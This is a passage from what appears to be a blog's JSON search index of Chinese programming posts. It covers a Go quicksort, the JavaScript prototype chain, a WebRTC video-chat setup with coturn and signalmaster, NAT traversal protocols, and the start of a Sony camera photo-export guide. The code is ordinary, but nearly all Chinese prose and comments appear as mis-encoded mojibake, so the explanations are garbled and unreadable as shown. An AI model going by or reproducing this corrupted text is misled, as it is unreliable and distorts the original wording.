{\n\tif left < right {\n\t\tmid := partition(arr, left, right)\n\t\tQuickSort(arr, left, mid-1)\n\t\tQuickSort(arr, mid+1, right)\n\t}\n}\n\nfunc partition(arr []int, left, right int) int {\n\n\tvalue := arr[left] // ä¸¤äººå¿ƒä¸­æ‰€æƒ³çš„æ•°å­—\n\tstart := left      // è®°å½•æ‰€æƒ³æ•°å­—çš„ä½ç½®ï¼Œç›¸é‡äº†è¦äº¤æ¢\n\n\tfor left != right { // ä¸¤äººä¸ç›¸é‡ï¼Œå°±å¾ªç¯\n\n\t\tfor left < right && arr[right] >= value { //ç‰›éƒå…ˆèµ°ï¼Œå¤§äºç­‰äºå°±èµ°ï¼Œå°äºå°±åœ\n\t\t\tright--\n\t\t}\n\t\tfor left < right && arr[left] <= value { //ç»‡å¥³åèµ°ï¼Œå°äºç­‰äºå°±èµ°ï¼Œå¤§äºå°±åœ\n\t\t\tleft++\n\t\t}\n\n\t\tif left < right { //åŒæ–¹åœæ­¢åæ‰“ç”µè¯äº¤æ¢è„šä¸‹çš„æ•°æ®\n\t\t\tarr[left], arr[right] = arr[right], arr[left]\n\t\t}\n\t\t//æ¥ç€å¾ªç¯ï¼Œç›´åˆ°ä¸¤äººç›¸é‡\n\t}\n\n\t// ç›¸é‡äº†ï¼ŒæŠŠä¸¤äººè„šä¸‹æ•°æ®å’Œå¿ƒä¸­æ•°å­—äº¤æ¢ï¼Œä¸‹é¢ left å’Œ right æ˜¯ç›¸ç­‰çš„\n\tarr[start], arr[left] = arr[left], arr[start]\n\n\treturn left\n}\n\nfunc Print(arr []int) {\n\tfor _, v := range arr {\n\t\tfmt.Printf(\"%d\\t\", v)\n\t}\n\tfmt.Print(\"\\n\")\n}\n\n```\n\n\n\n\n\n# 2. å®ç°çš„é—®é¢˜\n\n### 2.1 ä¸ºä»€ä¹ˆä»å³å¾€å·¦å¼€å§‹æ‰¾\n\nå¦‚æœå“¨å…µ i å…ˆèµ°ï¼Œç›¸é‡çš„åœ°ç‚¹æœ‰å¯èƒ½å¤§äºåŸºå‡†çš„å€¼ï¼Œè·ŸåŸºå‡†ä¸€äº¤æ¢ï¼Œå¤§çš„å€¼è·‘åˆ°å‰é¢å»äº†ï¼Œè‚¯å®šæ˜¯ä¸å¯¹çš„ã€‚\n\nå“¨å…µ j çš„å¯»æ‰¾æ¡ä»¶æ˜¯å°äºåŸºå‡†æ•°çš„æ•°ï¼Œæ‰€ä»¥æœ€ç»ˆå®šä½åˆ°çš„åºåˆ—ä¸­é—´çš„æ•°æ€»æ˜¯ä¼šå°äºåŸºå‡†æ•°ï¼Œäº¤æ¢åé¡ºåºæ˜¯å¯¹çš„ï¼Œè¿™æ ·å°±èƒ½ä¿è¯å¿«é€Ÿæ’åºæ­£ç¡®æ‰§è¡Œã€‚\n\n\n\n### 2.2 ä¸ºä»€ä¹ˆå¤§äºç­‰äºï¼Œå°äºç­‰äºå¼€å§‹èµ°ï¼Œä¸æ˜¯å¤§äºï¼Œå°äº\n\nå¦‚æœå°±ä¸¤ä¸ªæ•°ï¼Œæ­£ç¡®çš„ç»“æœæ˜¯ç›¸é‡äº¤æ¢ï¼Œè€Œä¸æ˜¯æ‰“ç”µè¯äº¤æ¢ã€‚\n\n+ 2ï¼Œ1\n  +  right å¤§äºç­‰äº2ä¸åŠ¨ï¼Œleft å°äºç­‰äº2èµ°ä¸€æ­¥ç›¸é‡\n+ 2ï¼Œ2\n  + right å¤§äºç­‰äº2èµ°ä¸€æ­¥ï¼Œç›´æ¥ç›¸é‡\n\n+ 1ï¼Œ2\n  + right å¤§äºç­‰äº1èµ°ä¸€æ­¥ï¼Œç›´æ¥ç›¸é‡\n\n\n\n### 2.3  å¦å¤–ä¸€ç§æ–¹æ¡ˆ\n\nåªè¦æœ‰ä¸€ä¸ªäººåœä¸‹ï¼Œå°±æ‰“ç”µè¯äº¤æ¢ï¼Œè¿™æ ·äº¤æ¢çš„æ¬¡æ•°ä¼šå¤šä¸€äº›ã€‚\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc parition(a []int, left, right int) int {\n\n\tvalue := a[left]\n\n\tfor left != right {\n\t\tfor left < right && a[right] >= value {\n\t\t\tright--\n\t\t}\n\t\ta[left], a[right] = a[right], a[left]\n\n\t\tfor left < right && a[left] <= value {\n\t\t\tleft++\n\t\t}\n\t\ta[left], a[right] = a[right], a[left]\n\t}\n\n\treturn left\n}\n\nfunc QuickSort(a []int, left, right int) {\n\tif left >= right {\n\t\treturn\n\t}\n\tmid := parition(a, left, right)\n\tQuickSort(a, left, mid-1)\n\tQuickSort(a, mid+1, right)\n}\n\nfunc main() {\n\ta := []int{6, 1, 2, 7, 9, 3, 4, 5, 10, 8}\n\tfmt.Println(a)\n\tQuickSort(a, 0, len(a)-1)\n\tfmt.Println(a)\n}\n\n/*\n[6 1 2 7 9 3 4 5 10 8]\n[1 2 3 4 5 6 7 8 9 10]\n*/\n```\n\n\n\n# 3. å¤´è„‘é£æš´\n\n+ è®°ä½ç‰›éƒç»‡å¥³, å…ˆå³å†å·¦\n+ èµ°çš„è¿‡ç¨‹æ¯”è¾ƒ,è¦ç”¨ >= æˆ– <=\n+ å†™ä¸¤ä¸ªå‡½æ•°, ä¸€ä¸ªåˆ†æ®µå‡½æ•°, ä¸€ä¸ªé€’å½’å‡½æ•°, é€’å½’çš„å‡½æ•°è¦æœ‰å‡ºå£\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html\n\n+ https://blog.csdn.net/qq_43990023/article/details/102297065\n\n","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"javascriptåŸå½¢é“¾çš„è‡ªæˆ‘ç†è§£","url":"%2Fp%2F6d00c950.html","content":"\n### Object å’Œ Function\n\né¦–å…ˆåœ¨ javascript ä¸­ æˆ‘ä»¬è¦æ˜ç¡®Object å’Œ Functionä¸¤ä¸ªæ¦‚å¿µ:\n\n+ ä¸‡ç‰©çš†å¯¹è±¡\n\n+ æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯å‡½æ•°åˆ›å»ºå‡ºæ¥\n\nä»”ç»†ç¢ç£¨è¿™ä¸¤å¥è¯, å…¶å®è¯´çš„ Object å’Œ Function æ˜¯ä¸€ä¸ªé¸¡ç”Ÿè›‹è¿˜æ˜¯è›‹ç”Ÿé¸¡çš„é—®é¢˜. ä¸ºä»€ä¹ˆè¿™ä¹ˆè®²å‘¢? å› ä¸ºå‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡, ä½†å¯¹è±¡åˆæ˜¯å‡½æ•°åˆ›å»ºå‡ºæ¥çš„. \n\n å…¶å®åŸå½¢é“¾çš„ä¸€åˆ‡æ±Ÿæ¹–æ©æ€¨éƒ½æ˜¯å›´ç»•ç€Functionå’ŒObjectä¸¤å¤§å®¶æ—å±•å¼€çš„.\n\n\n\n<!-- more -->\n\n### é¸¡å®¶æ—å’Œè›‹å®¶æ—\n\n+ æœ‰åˆ›é€ åŠ›çš„å‡½æ•°æˆ‘ä»¬ç§°ä¸ºFunctioné¸¡å®¶æ—, æ²¡æœ‰åˆ›é€ åŠ›çš„å¯¹è±¡æˆ‘ä»¬ç§°ä¸ºObjectè›‹å®¶æ—\n\n+ èŠ¸èŠ¸ä¼—ç”Ÿ,ä½ æˆ‘å¥¹éƒ½æ˜¯ä¸€ä¸ªè›‹å¯¹è±¡(~~). æˆ‘ä»¬éƒ½æ˜¯è¢«æŸä¸€ä¸ªå‡½æ•°åˆ›å»ºå‡ºæ¥, æˆ‘ä»¬å¯ä»¥ç§°ä¸ºåˆ›å»ºæˆ‘ä»¬çš„è¿™ä¸ªå‡½æ•°ä¸ºé¸¡çˆ¸çˆ¸, æˆ‘ä»¬æ¯äººéƒ½æœ‰ä¸€ä¸ªé¸¡çˆ¸çˆ¸\n\n+ æ³¨æ„åˆ›å»ºæˆ‘ä»¬çš„é¸¡çˆ¸çˆ¸å‡½æ•°, ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡. å®ƒæ›¾ç»ä¹Ÿæ˜¯è¢«æŸä¸€ä¸ªå‡½æ•°åˆ›å»ºå‡ºæ¥çš„\n\n\n\n### prototypeé¸¡æŠ€èƒ½ä»“åº“\n\n+ prototype æ˜¯ Functioné¸¡å®¶æ—ç‹¬æœ‰çš„æŠ€èƒ½ä»“åº“, æ²¡æœ‰åˆ›é€ èƒ½åŠ›çš„è›‹å®¶æ—æ²¡æœ‰è¿™ä¸ªä»“åº“.\n\n+ é¸¡æŠ€èƒ½ä»“åº“å†…æ”¾ç€é¸¡çˆ¸çˆ¸çš„å±æ€§å’Œå‡½æ•°ç­‰æŠ€èƒ½. ä¾‹å¦‚åƒå°ç±³ã€æ‰è™«å­ã€å˜å‡¤å‡°...\n\n+ æ³¨æ„é¸¡æŠ€èƒ½ä»“åº“å±äº Objectè›‹å®¶æ—,  å› ä¸ºé¸¡æŠ€èƒ½ä»“åº“æ²¡æœ‰åˆ›é€ èƒ½åŠ›, é¸¡æ‰æœ‰åˆ›é€ åŠ›\n\n\n\nOK, åˆ›å»ºæˆ‘ä»¬çš„é¸¡çˆ¸çˆ¸å®ƒæ‹¥æœ‰ prototype å±æ€§.  æ„å‘³ç€æ¯ä¸ªé¸¡éƒ½æ‹¥æœ‰ä¸€ä¸ªæŠ€èƒ½ä»“åº“, ä»“åº“çš„å¤§é—¨ä¸Šä¹Ÿå†™ç€æ‹¥æœ‰è€…åå­—(constructorå±æ€§), å³è¿™ä¸ªé¸¡æœ¬äººçš„åå­—\n\n+ prototype æ˜¯é¸¡çš„å±æ€§, è€Œconstructoræ˜¯é¸¡æŠ€èƒ½ä»“åº“çš„å±æ€§\n\n  \n\n###  \\__proto\\__ æ‹¥æœ‰é¸¡çˆ¸çˆ¸æŠ€èƒ½ä»“åº“çš„é’¥åŒ™\n\n\n\n+ \\__proto\\__ æ˜¯ä¸€ä¸ªéšè—çš„æŒ‡é’ˆ, ä¸‡ç‰©çš†æœ‰è¿™ä¸ªæŒ‡é’ˆ. æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ª \\__proto\\__ ç†è§£ä¸º æˆ‘æ‹¿ç€ä¸€æŠŠæˆ‘é¸¡çˆ¸çˆ¸æŠ€èƒ½ä»“åº“çš„é’¥åŒ™\n\n+ æˆ‘æ‹¿äº†ä¸€æŠŠé¸¡çˆ¸çˆ¸æŠ€èƒ½ä»“åº“é’¥åŒ™, æ„å‘³ç€æˆ‘å¯ä»¥ä½¿ç”¨é¸¡çˆ¸çˆ¸æŠ€èƒ½ä»“åº“çš„æŠ€èƒ½,  ä¾‹å¦‚åƒå°ç±³ã€æ‰è™«å­ã€å˜å‡¤å‡°...\n\n\n\né‚£ä¹ˆé¸¡çš„ \\__proto\\__ æŒ‡å‘è°? é¸¡æŠ€èƒ½ä»“åº“çš„  \\__proto\\__ åˆæŒ‡å‘è°?\n\n+ åˆ›å»ºé¸¡(å‡½æ•°å®¶æ—)çš„é¸¡çˆ¸çˆ¸ æ˜¯function Function(),  æ‰€ä»¥é¸¡çš„  \\__proto\\__ æŒ‡å‘ Function.prototype\n\n+ åˆ›å»ºé¸¡ä»“åº“(å¯¹è±¡å®¶æ—)çš„é¸¡çˆ¸çˆ¸æ˜¯function  Object(), æ‰€ä»¥é¸¡ä»“åº“çš„  \\__proto\\__ æŒ‡å‘ Object.prototype\n\n+ æœ€å Object. \\__proto\\__æŒ‡å‘äº† null\n\n\n\nOK, å¦‚æœæˆ‘è°ƒç”¨ä¸€ä¸ªå‡½æ•°, é‚£ä¹ˆå…ˆåœ¨æˆ‘èº«ä¸Šæ‰¾è¿™ä¸ªå‡½æ•°. \n\nå¦‚æœæ²¡æ‰¾åˆ°, å°±æ‹¿èµ·æˆ‘çš„é’¥åŒ™å»æˆ‘é¸¡çˆ¸çˆ¸çš„æŠ€èƒ½ä»“åº“å»æ‰¾.\n\nå¦‚æœè¿˜æ²¡æ‰¾åˆ°, å°±æ‹¿èµ·æŠ€èƒ½ä»“åº“å¯¹è±¡çš„é’¥åŒ™, å»ä»“åº“å¯¹è±¡é¸¡çˆ¸çˆ¸çš„æŠ€èƒ½ä»“åº“å»æ‰¾, ä¸€ç›´æ‰¾åˆ° nullä¸ºæ­¢.\n\n\n\n### åˆ†æä¸€å¼ å›¾\n\n![img](javascriptåŸå½¢é“¾çš„è‡ªæˆ‘ç†è§£/1.png)\n\n\n\nä¸Šé¢éƒ¨åˆ†:\n\n+ f1 = new Foo()  æˆ‘æ˜¯f1, æ²¡æœ‰prototypeä»“åº“,  æˆ‘çš„  \\__proto\\__ æŒ‡å‘äº†é¸¡çˆ¸çˆ¸çš„ä»“åº“ Foo.prototype\n+ é¸¡çˆ¸çˆ¸(Function Foo)çš„æŠ€èƒ½ä»“åº“(prototype)æ˜¯ Foo.prototype, ä»“åº“çš„åå­—(constructor)æ˜¯ function Foo()\n\n+ é¸¡æŠ€èƒ½ä»“åº“Foo.prototypeçš„ \\__proto\\__ æŒ‡å‘äº† Object.prototype,  Object.prototypeçš„  \\__proto\\__ æŒ‡å‘äº† null (å‰é¢å·²ç»æè¿‡)\n\nå·¦ä¾§éƒ¨åˆ†:\n\n+ function Fooçš„é¸¡çˆ¸çˆ¸æ˜¯ function Function(), å› ä¸ºæ˜¯è¿™ä¸ªå‡½æ•°åˆ›å»ºäº†é¸¡çˆ¸çˆ¸, æ‰€ä»¥ Function Fooçš„ \\__proto\\__æŒ‡å‘äº† Function.prototype ä»“åº“\n+ å†çœ‹function Function()  å®ƒçš„æŠ€èƒ½ä»“åº“æ˜¯ Function.prototype, æŠ€èƒ½ä»“åº“åå­—æ˜¯ function Function() .  å¦å¤–è¿‡åˆ†çš„æ˜¯function Function() æ˜¯è¢«å®ƒè‡ªå·±function Function()åˆ›å»ºå‡ºæ¥çš„, æ‰€ä»¥å®ƒçš„ \\__proto\\__æŒ‡å‘äº†è‡ªå·±çš„æŠ€èƒ½ä»“åº“\n\nä¸­é—´éƒ¨åˆ†: \n+ function Objectçš„  \\__proto\\__  æŒ‡å‘äº†Function.prototype çœ‹æ¥æ‰€æœ‰é¸¡çš„é’¥åŒ™éƒ½æŒ‡å‘äº†Function.prototype\n+ æŠ€èƒ½ä»“åº“Function.prototypeçš„ \\__proto\\__ æŒ‡å‘äº† Object.prototype,  Object.prototypeçš„  \\__proto\\__ æŒ‡å‘äº† null \n\n\n\n### instanceof å¯»ä»“åº“è¿ç®—ç¬¦\n\ninstanceofè¿ç®—ç¬¦çš„ç¬¬ä¸€ä¸ªå˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡(è›‹å®¶æ—)ï¼Œæš‚æ—¶ç§°ä¸ºAï¼›ç¬¬äºŒä¸ªå˜é‡ä¸€èˆ¬æ˜¯ä¸€ä¸ªå‡½æ•°(é¸¡å®¶æ—)ï¼Œæš‚æ—¶ç§°ä¸ºBã€‚\n\nInstanceofçš„åˆ¤æ–­é˜Ÿåˆ™æ˜¯ï¼šæ²¿ç€Açš„ \\__proto\\__ è¿™æ¡çº¿æ¥æ‰¾ï¼ŒåŒæ—¶æ²¿ç€Bçš„prototypeè¿™æ¡çº¿æ¥æ‰¾ï¼Œå¦‚æœä¸¤æ¡çº¿èƒ½æ‰¾åˆ°åŒä¸€ä¸ªå¼•ç”¨ï¼Œå³åŒä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå°±è¿”å›trueã€‚å¦‚æœæ‰¾åˆ°ç»ˆç‚¹è¿˜æœªé‡åˆï¼Œåˆ™è¿”å›falseã€‚\n\n\n\n```javascript\nconsole.log(Object instanceof Function); //true\nconsole.log(Function instanceof Object); //true\nconsole.log(Function instanceof Function); //true\n```\n\n\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"æ­å»ºwebRTCè§†é¢‘èŠå¤©","url":"%2Fp%2F697b4dfa.html","content":"\n\n\næƒ³åœ¨å…¬ç½‘ä¸Šå®ç°è§†é¢‘é€šä¿¡ï¼Œéœ€è¦ä¸‹é¢3ä¸ªæ ¸å¿ƒå…ƒç´ ï¼š\n\n1. ä¸€ä¸ªæ˜¯NATç©¿é€æœåŠ¡å™¨(ICE Server)ï¼Œå®ç°å†…ç½‘ç©¿é€ã€‚\n2. åŸºäºWebSocketçš„ä¿¡ä»¤æœåŠ¡å™¨(Signaling Server)ï¼Œç”¨äºå»ºç«‹ç‚¹å¯¹ç‚¹çš„é€šé“ã€‚\n3. Webå®¢æˆ·ç«¯ã€‚é€šè¿‡H5çš„WebRTCç‰¹æ€§è°ƒç”¨æ‘„åƒå¤´ï¼Œè¿›è¡Œç”¨æˆ·äº¤äº’ã€‚\n\n<!-- more -->\n\n## 1. æ­å»ºNATç©¿é€æœåŠ¡å™¨coturn\n\n+ æ•™ç¨‹:\n\nhttps://github.com/coturn/coturn/wiki/README\n\n\n\n+ å‡†å¤‡å·¥ä½œ: \n\n```shell\nsudo yum install gcc\nsudo yum install openssl-devel\nsudo yum install libevent\nsudo yum install libevent-devel\nsudo yum install sqlite\nsudo yum install sqlite-devel\n\nå‚è§: https://github.com/coturn/coturn/blob/master/INSTALL\n```\n\n\n\n+ å¼€å§‹å®‰è£…:\n\n```shell\ngit clone https://github.com/coturn/coturn\n./configure\nmake\nsudo make install\n```\n\n\n\n+ å¯åŠ¨:\n\n```shell\ncp examples/etc/turnserver.conf bin/turnserver.conf\nvi bin/turnserver.conf\n\nä¿®æ”¹é…ç½®turnserver.confï¼Œå¦‚ä¸‹ï¼š\n#ç›‘å¬ç«¯å£ \nlistening-port=3478 \n#å†…ç½‘IP \nlistening-ip=ä½ çš„æœåŠ¡å™¨å†…ç½‘IP\n#å¤–ç½‘IPåœ°å€ \nexternal-ip=ä½ çš„æœåŠ¡å™¨å¤–ç½‘IP\n#è®¿é—®çš„ç”¨æˆ·ã€å¯†ç  \nuser=user:password\n\n\ncd bin\nturnserver -v -r 207.246.80.69:3478 -a -o  //207.246.80.69æ˜¯æˆ‘çš„æœåŠ¡å™¨å¤–ç½‘åœ°å€\n```\n\n\n\n+ æµ‹è¯•:\n\næ‰“å¼€ [https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/ ](https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/)è¿›è¡Œæµ‹è¯•\n\n![image-20190129145807612](æ­å»ºwebRTCè§†é¢‘èŠå¤©/1.png)\n\n\n\næµ‹è¯•æ—¶å¯ä»¥çœ‹log (https://github.com/coturn/coturn/wiki/README#logs)\n\n```\ntail -f /var/tmp/turn_æ—¥æœŸ.log \n```\n\n\n\n\n\n## 2. æ­å»ºä¿¡ä»¤æœåŠ¡å™¨simplemaster\n\n ä¿¡ä»¤æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯ [**signalmaster**](https://github.com/andyet/signalmaster) ï¼ŒåŸºäºwebsocketã€‚é€‰ç”¨å®ƒçš„åŸå› æ˜¯å¯ä»¥ç›´æ¥é›†æˆturn serveræœåŠ¡å™¨ã€‚\n\n```shell\ngit clone https://github.com/andyet/signalmaster.git\ncd signalmaster\nnpm install express\nnpm install yetify\nnpm install getconfig\nnpm install node-uuid\nnpm install socket.io\n\n\næˆ–è€…\n\ngit clone https://github.com/nguyenphu160196/signalmaster.git\ncd signalmaster\nnpm install\n```\n\n\n\nsignalmasterå¯ä»¥è¿æ¥turnserverï¼Œä½†ä¸æ”¯æŒç”¨æˆ·å/å¯†ç æ–¹å¼ï¼Œéœ€è¦å¯¹æºç sockets.js 110è¡Œè¿›è¡Œè°ƒæ•´ï¼Œè°ƒæ•´åçš„ä»£ç å¦‚ä¸‹ï¼š\n\n```javascript\n    if (!config.turnorigins || config.turnorigins.indexOf(origin) !== -1) {\n            config.turnservers.forEach(function (server) {\n                credentials.push({\n                    username: server.username,\n                    credential: server.credential,\n                    urls: server.urls || server.url\n                });\n            });\n        }\n\n```\n\n\n\nå®Œæˆåï¼Œä¿®æ”¹config/production.jsonï¼Œé…ç½®turnserverçš„ç”¨æˆ·å’Œå¯†ç ï¼Œå¦‚ä¸‹ï¼š\n\n```json\n{\n  \"isDev\": true,\n  \"server\": {\n    \"port\": 8888,\n    \"/* secure */\": \"/* whether this connects via https */\",\n    \"secure\": false,\n    \"key\": null,\n    \"cert\": null,\n    \"password\": null\n  },\n  \"rooms\": {\n    \"/* maxClients */\": \"/* maximum number of clients per room. 0 = no limit */\",\n    \"maxClients\": 0\n  },\n  \"stunservers\": [\n    {\n      \"urls\": \"stun:stun.ekiga.net:3478\"\n    }\n  ],\n  \"turnservers\": [\n    {\n      \"urls\": [\"turn:www.turn.cn:3478\"],\n      \"username\": \"user\",\n      \"credential\":\"pass\",  \n      \"expiry\": 86400\n    }\n  ]\n}\n```\n\n\n\nå¯åŠ¨:\n\n```shell\nnohup node server.js &\n\n//Output:\n&yet -- signal master is running at: http://localhost:8888\n```\n\n\n\n## 3. æ­å»ºWebå®¢æˆ·ç«¯\n\nå¤åˆ¶ä¸‹é¢çš„ä»£ç ï¼Œä¿å­˜ä¸ºä¸€ä¸ªhtmlæ–‡ä»¶, æ”¾åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Š\n\n```html\n\n<!DOCTYPE html>\n<html>\n<head>\n    <script src=\"https://code.jquery.com/jquery-1.9.1.js\"></script>\n    <script src=\"http://simplewebrtc.com/latest-v3.js\"></script>\n    <script>\n \n        var webrtc = new SimpleWebRTC({\n            // the id/element dom element that will hold \"our\" video\n            localVideoEl: 'localVideo',\n            // the id/element dom element that will hold remote videos\n            remoteVideosEl: 'remoteVideos',\n            // immediately ask for camera access\n            autoRequestMedia: true,\n            url:'http://207.246.80.69:8888',\n            nick:'nickname'\n        });\n \n \n \n        // we have to wait until it's ready\n        webrtc.on('readyToCall', function () {\n            // you can name it anything\n            webrtc.joinRoom('roomid');\n \n            // Send a chat message\n            $('#send').click(function () {\n                var msg = $('#text').val();\n                webrtc.sendToAll('chat', { message: msg, nick: webrtc.config.nick });\n                $('#messages').append('<br>You:<br>' + msg + '\\n');\n                $('#text').val('');\n            });\n        });\n \n        //For Text Chat ------------------------------------------------------------------\n        // Await messages from others\n        webrtc.connection.on('message', function (data) {\n            if (data.type === 'chat') {\n                console.log('chat received', data);\n                $('#messages').append('<br>' + data.payload.nick + ':<br>' + data.payload.message+ '\\n');\n            }\n        });\n        \n    </script>\n    <style>\n        #remoteVideos video {\n            height: 150px;\n        }\n \n        #localVideo {\n            height: 150px;\n        }\n    </style>\n</head>\n<body>\n    <textarea id=\"messages\" rows=\"5\" cols=\"20\"></textarea><br />\n    <input id=\"text\" type=\"text\" />\n    <input id=\"send\" type=\"button\" value=\"send\" /><br />\n    <video id=\"localVideo\"></video>\n    <div id=\"remoteVideos\"></div>\n</body>\n</html>\n```\n\n\n\nnginxé…ç½®:\n\n```nginx\nserver {\n        listen 8080 default_server;\n        listen [::]:8080 default_server;\n\n        root /home/liuwei/web;\n        index index.html;\n}\n```\n\n+ æ‰“å¼€firefoxå¼€å§‹æµ‹è¯•  http://207.246.80.69:8080, chromeéœ€è¦https\n\n+ http://simplewebrtc.com/latest-v3.js å¯èƒ½ä¸¢å¤±, å‚è€ƒhttps://github.com/andyet/SimpleWebRTC/blob/gh-pages/latest-v3.js\n\n+ å…¶ä¸­urlæ˜¯ä¿¡ä»¤æœåŠ¡å™¨çš„åœ°å€ã€nicknameã€roomidæ ¹æ®éœ€è¦ä¿®æ”¹\n\n  \n\n  \n\n### 4. å‚è€ƒèµ„æ–™:\n\n+ https://www.cnblogs.com/yubaolee/p/webrtc.html\n\n+ https://blog.csdn.net/csj6346/article/details/81455663","tags":["webrtc"],"categories":["javascript"]},{"title":"natç©¿é€,stun,turn,iceä»‹ç»","url":"%2Fp%2Ff3e0f5f5.html","content":"\n### 1. NATç½‘ç»œåœ°å€è½¬æ¢:  \n\nèµ„æ–™: https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2\n\n\n\nå®Œå…¨åœ†é”¥å‹NAT( Full Cone NAT )\n\nåœ°å€é™åˆ¶åœ†é”¥å‹NAT( Address Restricted Cone NAT )\n\nç«¯å£é™åˆ¶åœ†é”¥å‹NAT( Port Restricted Cone NAT ) \n\nå¯¹ç§°å‹NAT( Symmetric NAT)\n\n<!-- more -->\n\n### 2. STUN(Session Traversal Utilities for NAT)\n\nèµ„æ–™: <https://zh.wikipedia.org/wiki/STUN>\n\n\n\nSTUNï¼ŒNATä¼šè¯ç©¿è¶Šåº”ç”¨ç¨‹åº <https://tools.ietf.org/html/rfc5389>ï¼‰æ˜¯ä¸€ç§[ç½‘ç»œåè®®](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE)ï¼Œå®ƒå…è®¸ä½äº[NAT](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2)ï¼ˆæˆ–å¤šé‡NATï¼‰åçš„å®¢æˆ·ç«¯æ‰¾å‡ºè‡ªå·±çš„å…¬ç½‘åœ°å€ï¼ŒæŸ¥å‡ºè‡ªå·±ä½äºå“ªç§ç±»å‹çš„NATä¹‹åä»¥åŠNATä¸ºæŸä¸€ä¸ªæœ¬åœ°ç«¯å£æ‰€ç»‘å®šçš„Internetç«¯ç«¯å£ã€‚è¿™äº›ä¿¡æ¯è¢«ç”¨æ¥åœ¨ä¸¤ä¸ªåŒæ—¶å¤„äºNATè·¯ç”±å™¨ä¹‹åçš„ä¸»æœºä¹‹é—´åˆ›å»ºUDPé€šä¿¡ã€‚è¯¥åè®®ç”±RFC 5389å®šä¹‰ã€‚\n\nå››ç§ä¸»è¦ç±»å‹ä¸­æœ‰ä¸‰ç§æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼š[å®Œå…¨åœ†é”¥å‹NAT](https://zh.wikipedia.org/w/index.php?title=%E5%AE%8C%E5%85%A8%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)ã€[å—é™åœ†é”¥å‹NAT](https://zh.wikipedia.org/w/index.php?title=%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)å’Œ[ç«¯å£å—é™åœ†é”¥å‹NAT](https://zh.wikipedia.org/w/index.php?title=%E7%AB%AF%E5%8F%A3%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)â€”â€”ä½†å¤§å‹å…¬å¸ç½‘ç»œä¸­ç»å¸¸é‡‡ç”¨çš„å¯¹ç§°å‹NATï¼ˆåˆç§°ä¸ºåŒå‘NATï¼‰åˆ™ä¸èƒ½ä½¿ç”¨ã€‚\n\n\n\n### 3. TURN(Traversal Using Relay NAT)\n\nèµ„æ–™:  <https://zh.wikipedia.org/wiki/TURN>\n\n\n\nTURNï¼ˆ <https://tools.ietf.org/html/rfc5766>ï¼‰ï¼Œæ˜¯ä¸€ç§æ•°æ®ä¼ è¾“åè®®ï¼ˆdata-transfer protocolï¼‰ã€‚å…è®¸åœ¨TCPæˆ–UDPçš„è¿åœ¨çº¿è·¨è¶Š[NAT](https://zh.wikipedia.org/wiki/NAT)æˆ–[é˜²ç«å¢™](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)ã€‚\n\n\n\n### 4. ICE(Interactive Connectivity Establishment) \n\nèµ„æ–™: https://zh.wikipedia.org/wiki/%E4%BA%92%E5%8B%95%E5%BC%8F%E9%80%A3%E6%8E%A5%E5%BB%BA%E7%AB%8B>\n\n\n\niceæ˜¯ä¸€ç§ç»¼åˆæ€§çš„[NATç©¿è¶Š](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E8%B6%8A)çš„æŠ€æœ¯, æ˜¯ç”±[IETF](https://zh.wikipedia.org/wiki/IETF)çš„MMUSICå·¥ä½œç»„å¼€å‘å‡ºæ¥çš„ä¸€ç§frameworkï¼Œå¯é›†æˆå„ç§[NATç©¿é€](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E9%80%8F)æŠ€æœ¯ï¼Œå¦‚[STUN](https://zh.wikipedia.org/wiki/STUN)ã€[TURN](https://zh.wikipedia.org/wiki/TURN)ï¼ˆTraversal Using Relay NATï¼Œä¸­ç»§NATå®ç°çš„ç©¿é€ï¼‰ã€RSIPï¼ˆRealm Specific IPï¼Œç‰¹å®šåŸŸIPï¼‰ç­‰ã€‚è¯¥frameworkå¯ä»¥è®©SIPçš„å®¢æˆ·ç«¯åˆ©ç”¨å„ç§NATç©¿é€æ–¹å¼æ‰“ç©¿è¿œç¨‹çš„[é˜²ç«å¢™](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)ã€‚\n\n\n\n### 5. ä¸‰ä¸ªåè®®ä»‹ç»\n\nèµ„æ–™:  <https://blog.csdn.net/byxdaz/article/details/52786600>  \n","tags":["nat"],"categories":["ç³»ç»Ÿ"]},{"title":"sonyç›¸æœºç…§ç‰‡å¯¼å‡ºæ“ä½œ","url":"%2Fp%2Fe672b089.html","content":"\n\n\n### 1. ç…§ç‰‡å¯¼å‡ºåˆ°æ‰‹æœºä¸Š(æ–¹ä¾¿å¿«é€Ÿä½¿ç”¨å’Œä¿®æ”¹)\n\n1. sony ç›¸æœº-> ç¬¬ä¸‰é¡¹ -> å‘é€åˆ°æ™ºèƒ½æ‰‹æœº -> åœ¨æ™ºèƒ½æ‰‹æœºä¸Šé€‰æ‹© -> å‡ºç°äº† wifi\n2. æ‰‹æœºè¿æ¥sony ç›¸æœºçš„ wifi\n3. æ‰‹æœº->Imaging Edge 